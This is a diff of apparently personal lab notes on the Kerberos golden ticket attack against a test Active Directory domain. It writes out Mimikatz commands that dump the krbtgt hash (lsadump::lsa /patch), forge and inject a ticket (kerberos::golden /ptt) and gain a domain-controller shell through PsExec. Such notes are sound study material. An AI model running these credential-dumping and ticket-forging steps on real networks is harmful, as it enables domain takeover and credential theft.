@@ -4,28 +4,31 @@ GOLDEN TICKETS
 KDC encrypts TGT with its secret key. This secret key is password hash of a domain user account called krbtgt. If we can obtain 
 krbtgt password hash, we can create a self-made TGT, also known as golden tickets.
 
-Test
-Move laterally from Win10 to DC via PsExec as a regular user.
-> psexec.exe \\dc.hacker.testlab cmd.exe
-Access Denied
-
-Go to DC as admin user and cd to C:
+Go to DC as admin user and obtain krbtgt hash using mimikatz.
 mimikatz# privilege::debug
 mimikatz# lsadump::lsa /patch
 
-// delete existing tickets
-mimikatz# kerberos::purge
-// obtain SID
+Go to windows 10 client machine and try to move laterally to DC via PsExec as regular user
+> psexec.exe \\dc.hacker.testlab cmd.exe
+Access Denied
+// obtain SID. Exclude the user part. Example for S-1-5-21-511870593-2731438996-3089629929-500 then exclude 500
 > whoami /user
+// Open mimikatz and delete existing tickets. Create a new TGT for fakeuser using krbtgt hash and SID
+mimikatz# kerberos::purge
 mimikatz# kerberos::golden /user:fakeuser /domain:hacker.testlab /sid:<> /krbtgt:<> /ptt
-
-Once golden ticket is injected into memory
+// Once golden ticket is injected into memory, launch cmd.exe
 mimikatz# misc::cmd
-> psexec.exe \\dc.hacker cmd.exe
+> psexec.exe \\dc cmd.exe
 > whoami 
 fake user
 > whoami /groups
-Domain Admins
+Member of powerful groups like domain admin, enterprise admin etc.
+
+If we were to use IP instead of domain name, we would get access denied because it forces NTLM auth
+> psexec.exe \\172.16.169.200 cmd.exe
+Access Denied
+
+We used kerberos ticket to get to DC and bypassed NTLM authentication. Hence, it is also a kind of Overpass the hash.
 
 ------------------------------
 DOMAIN CONTROL SYNCHRONIZATION
